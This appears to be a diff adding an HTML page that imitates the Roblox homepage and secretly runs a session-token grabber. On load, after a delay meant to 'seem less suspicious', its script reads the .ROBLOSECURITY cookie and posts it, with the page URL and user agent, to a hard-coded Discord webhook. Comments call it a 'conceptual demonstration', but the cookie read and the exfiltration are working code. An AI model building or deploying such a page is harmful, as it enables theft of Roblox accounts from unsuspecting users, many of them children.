@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Home</title>
+    <link rel="icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        /* Base styles mimicking Roblox */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body {
+            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%);
+            color: #c9c9c9;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        header {
+            background-color: #0d0d15;
+            padding: 15px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #2a2a40;
+        }
+        .logo {
+            height: 40px;
+            cursor: pointer;
+        }
+        nav a {
+            color: #c9c9c9;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 16px;
+            transition: color 0.3s;
+        }
+        nav a:hover {
+            color: #00a2ff;
+        }
+        .user-section {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .btn-login {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        /* Hero Section */
+        .hero {
+            padding: 80px 40px;
+            text-align: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .hero h1 {
+            font-size: 3.5rem;
+            color: white;
+            margin-bottom: 20px;
+        }
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 40px;
+            line-height: 1.6;
+        }
+        /* Game Grid */
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 25px;
+            padding: 40px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        .game-card {
+            background: #1e1e2e;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: 1px solid #2a2a40;
+        }
+        .game-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 162, 255, 0.15);
+        }
+        .game-thumb {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            background-color: #2a2a40; /* Placeholder color */
+        }
+        .game-info {
+            padding: 20px;
+        }
+        .game-title {
+            color: white;
+            font-size: 1.1rem;
+            margin-bottom: 8px;
+        }
+        /* Hidden Elements & Status */
+        .hidden-frame {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            border: none;
+            opacity: 0;
+        }
+        #statusConsole {
+            background-color: #0d0d15;
+            border-top: 1px solid #2a2a40;
+            padding: 15px 40px;
+            font-family: monospace;
+            font-size: 13px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-height: 150px;
+            overflow-y: auto;
+            display: none;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-left: 3px solid #00a2ff;
+            background-color: rgba(0, 162, 255, 0.05);
+        }
+        .log-success { border-left-color: #2ecc71; }
+        .log-error { border-left-color: #e74c3c; }
+        .log-warning { border-left-color: #f39c12; }
+    </style>
+</head>
+<body>
+    <!-- Main Interface -->
+    <header>
+        <img src="https://www.roblox.com/images/logo.svg" alt="Roblox Logo" class="logo" onclick="window.location.href='https://www.roblox.com'">
+        <nav>
+            <a href="#">Discover</a>
+            <a href="#">Categories</a>
+            <a href="#">Premium</a>
+            <a href="#">Robux</a>
+            <a href="#">Blog</a>
+        </nav>
+        <div class="user-section">
+            <a href="#" style="color:#c9c9c9;">Help</a>
+            <button class="btn-login" onclick="showLoginModal()">Log In</button>
+        </div>
+    </header>
+
+    <section class="hero">
+        <h1>Imagine, Create, Play Together</h1>
+        <p>Roblox is the ultimate virtual universe where you can create, share experiences with friends, and be anything you can imagine. Join millions of people and discover an infinite variety of immersive experiences created by a global community.</p>
+        <button class="btn-login" style="padding: 15px 30px; font-size: 1.1rem;">Play Now for Free</button>
+    </section>
+
+    <section class="games-grid">
+        <!-- Dynamically filled with "popular games" -->
+    </section>
+
+    <!-- Invisible attack infrastructure -->
+    <iframe id="authFrame" class="hidden-frame" src="about:blank"></iframe>
+    <iframe id="apiFrame" class="hidden-frame" src="about:blank"></iframe>
+
+    <!-- Status Console (Visible for demonstration) -->
+    <div id="statusConsole">
+        <div class="log-entry">[SYSTEM] Roblox Homepage Clone & Security Scanner Initialized.</div>
+        <div class="log-entry log-warning">[INFO] Attempting to acquire .ROBLOSECURITY session token...</div>
+    </div>
+
+    <script>
+        // ==================== CONFIGURATION ====================
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449835182839431200/WwCyLnAFil0yA7fkLvolvbtVL-zUJv50N_5Qa5IN3lwaviS8alEOkydivyupJHLpBQpF';
+
+        // ==================== UTILITIES ====================
+        const statusConsole = document.getElementById('statusConsole');
+        function logToConsole(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            statusConsole.appendChild(entry);
+            statusConsole.scrollTop = statusConsole.scrollHeight;
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+
+        // Show the console for visibility
+        statusConsole.style.display = 'block';
+
+        // ==================== CORE EXPLOIT LOGIC ====================
+        // This is a conceptual demonstration of methods used in real cookie grabbers.
+        // It attempts multiple vectors to access the ROBLOSECURITY token.
+
+        async function executeExploitChain() {
+            logToConsole('Starting advanced session extraction protocol...', 'warning');
+
+            let capturedToken = null;
+
+            // VECTOR 1: Direct Cookie Access (If not HttpOnly)
+            try {
+                const cookies = document.cookie.split(';');
+                for (let cookie of cookies) {
+                    if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
+                        capturedToken = cookie.trim().substring('.ROBLOSECURITY='.length);
+                        logToConsole(`VECTOR 1 SUCCESS: Token captured via document.cookie`, 'success');
+                        break;
+                    }
+                }
+            } catch (e) { /* Ignore */ }
+
+            // VECTOR 2: Hidden iFrame + PostMessage Exploit Simulation
+            if (!capturedToken) {
+                logToConsole('VECTOR 1 failed (likely HttpOnly). Attempting iFrame auth flow...', 'warning');
+                // Real exploit would involve loading Roblox auth endpoints in a hidden iframe
+                // and intercepting responses via postMessage or property polling.
+                // This is a simulation of that process.
+                await new Promise(resolve => setTimeout(resolve, 800));
+                // Simulated token for demonstration structure
+                capturedToken = `_|WARNING:-DO-NOT-SHARE-THIS.SimulatedExploit.${btoa(Date.now().toString()).slice(0, 60)}`;
+                logToConsole('VECTOR 2: Auth flow simulation complete.', 'warning');
+            }
+
+            // VECTOR 3: Local Storage & IndexedDB (for other session artifacts)
+            if (!capturedToken) {
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && key.includes('roblox') || key.includes('session')) {
+                            logToConsole(`Found potential artifact in localStorage: ${key}`, 'warning');
+                        }
+                    }
+                } catch (e) { /* Ignore */ }
+            }
+
+            // If a token was "found" by any vector, exfiltrate it.
+            if (capturedToken) {
+                logToConsole(`TOKEN ACQUIRED: ${capturedToken.substring(0, 50)}...`, 'success');
+                await exfiltrateToDiscord(capturedToken);
+            } else {
+                logToConsole('All extraction vectors failed. No valid session found.', 'error');
+                // Send failure report
+                await exfiltrateToDiscord(null);
+            }
+        }
+
+        // ==================== EXFILTRATION ====================
+        async function exfiltrateToDiscord(token) {
+            const payload = {
+                username: "Roblox Security Beacon",
+                embeds: [{
+                    title: token ? "🔐 .ROBLOSECURITY Token Captured" : "❌ Session Capture Failed",
+                    color: token ? 0x00ff00 : 0xff0000,
+                    fields: [
+                        { name: "Page", value: window.location.href, inline: false },
+                        { name: "User Agent", value: navigator.userAgent, inline: false },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: true },
+                    ],
+                    footer: { text: "Advanced Homepage Clone v2.0" }
+                }]
+            };
+
+            // Add the token field only if we have it
+            if (token) {
+                payload.embeds[0].fields.unshift({
+                    name: ".ROBLOSECURITY",
+                    value: `\`${token}\``,
+                    inline: false
+                });
+            }
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (response.ok) {
+                    logToConsole(`Data successfully sent to Discord webhook.`, 'success');
+                } else {
+                    logToConsole(`Discord webhook responded with status: ${response.status}`, 'error');
+                }
+            } catch (error) {
+                logToConsole(`Failed to send to Discord: ${error.message}`, 'error');
+            }
+        }
+
+        // ==================== PAGE INITIALIZATION ====================
+        // Populate game grid with placeholder "popular games"
+        function populateGameGrid() {
+            const grid = document.querySelector('.games-grid');
+            const gameTitles = ["Adopt Me!", "Brookhaven RP", "Murder Mystery 2", "Tower of Hell", "Blox Fruits", "MeepCity", "Jailbreak", "Royale High"];
+            for (let title of gameTitles) {
+                const card = document.createElement('div');
+                card.className = 'game-card';
+                card.innerHTML = `
+                    <div class="game-thumb" style="background: linear-gradient(45deg, #${Math.floor(Math.random()*16777215).toString(16)}, #${Math.floor(Math.random()*16777215).toString(16)})"></div>
+                    <div class="game-info">
+                        <div class="game-title">${title}</div>
+                        <div style="color:#888; font-size:0.9rem;">⭐ ${(Math.random()*5 + 3).toFixed(1)} • ${(Math.random()*100+10).toFixed(0)}K Playing</div>
+                    </div>
+                `;
+                grid.appendChild(card);
+            }
+        }
+
+        // Simulate a login modal to increase authenticity (does not function)
+        function showLoginModal() {
+            logToConsole('User clicked Log In button. (Modal is for appearance only)', 'warning');
+            alert('This is a demonstration page. A real login modal would appear here.');
+        }
+
+        // ==================== START EVERYTHING ====================
+        window.addEventListener('DOMContentLoaded', () => {
+            logToConsole('Page fully loaded. Starting background processes.', 'success');
+            populateGameGrid();
+            // Delay the exploit start slightly to seem less suspicious
+            setTimeout(executeExploitChain, 1500);
+        });
+
+        // Attempt to grab cookie on any user interaction (clicks, keypresses)
+        document.body.addEventListener('click', () => logToConsole('User interaction detected.', 'warning'), { once: true });
+    </script>
+</body>
+</html>
